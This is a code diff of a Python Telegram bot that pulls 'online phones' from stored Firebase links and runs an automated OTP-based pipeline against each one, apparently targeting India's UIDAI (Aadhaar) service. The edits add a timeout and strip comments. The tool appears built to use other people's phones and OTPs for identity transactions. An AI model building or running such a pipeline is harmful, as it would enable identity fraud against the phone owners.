-# 🚀 AUTO BATCH RUNNER — STRICTLY SEQUENTIAL (1 phone at a time)
+# 🚀 AUTO BATCH RUNNER — STRICTLY SEQUENTIAL
 # ==============================================================================
 async def run_auto_batch(bot, chat_id, max_phones=None):
-    """
-    /auto — strictly SEQUENTIAL pipeline.
-    Detects all online phones, then processes ONE AT A TIME.
-    Only starts the next phone AFTER the current one fully finishes.
-    """
     links = _load_firebase_links()
     if not links:
         bot.send_message(chat_id, "📭 No Firebase links. Use /addfire URL first.", parse_mode='HTML')
@@ -1202,7 +1529,6 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
     )
     announce_mid = announce_msg.message_id if announce_msg else None
 
-    # ---- 1. Detect ALL online phones ----
     all_targets = []
     seen_phones = set()
     async with aiohttp.ClientSession() as session:
@@ -1241,7 +1567,7 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
                     f"━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"📱 <b>Detected:</b> {len(all_targets)} online phone(s)\n"
                     f"🎯 <b>Processing:</b> {total}\n"
-                    f"⚙️ <b>Mode:</b> SEQUENTIAL (1 at a time)\n"
+                    f"⚙️ <b>Mode:</b> DIRECT UIDAI (no subprocess)\n"
                     f"🔄 <b>Retry:</b> up to 2 attempts per phone\n"
                     f"⏱️ <b>OTP timeout:</b> {EID_OTP_TIMEOUT}s each\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -1251,7 +1577,6 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
             )
         except: pass
 
-    # ---- 3. STRICTLY SEQUENTIAL LOOP ----
     results = {"success": 0, "failed": 0}
 
     for i, t in enumerate(targets):
@@ -1275,13 +1600,19 @@ async def run_auto_batch(bot, chat_id, max_phones=None):
         engine.update_status = prefixed
 
         try:
-            success = await engine.run_auto_pipeline(chat_id, phone, url, cid, idx, total)
+            success = await asyncio.wait_for(
+                engine.run_auto_pipeline(chat_id, phone, url, cid, idx, total),
+                timeout=300
+            )
             if success:
                 results["success"] += 1
                 print(f"✅ [AUTO SEQ] #{idx}/{total} {phone} SUCCESS", flush=True)
             else:
                 results["failed"] += 1
                 print(f"❌ [AUTO SEQ] #{idx}/{total} {phone} FAILED", flush=True)
+        except asyncio.TimeoutError:
+            print(f"⏰ [AUTO SEQ] #{idx}/{total} {phone} TIMED OUT (5 min)", flush=True)
+            results["failed"] += 1
         except Exception as e:
             print(f"❌ [AUTO SEQ] #{idx}/{total} {phone} crashed: {e}", flush=True)
             results["failed"] += 1
@@ -1336,7 +1667,7 @@ def start_auto_batch(bot, chat_id, max_phones=None):
 
 
 # ==============================================================================
-# LEGACY: execute_task / prewarm_engine for /start manual flow
+# LEGACY helpers for /start manual flow
 # ==============================================================================
 async def execute_task(bot, chat_id, name, mobile, dob, user_info=None):
     str_chat_id = str(chat_id)
@@ -1383,9 +1714,6 @@ def prewarm_engine(bot, chat_id, mobile=None):
         engine.start_early_phase1(mobile)
 
 
-# ==============================================================================
-# Scan helper (used by /runall legacy)
-# ==============================================================================
 async def scan_all_firebase_phones(limit_per_link=None, max_targets=5):
     links = _load_firebase_links()
     if not links:
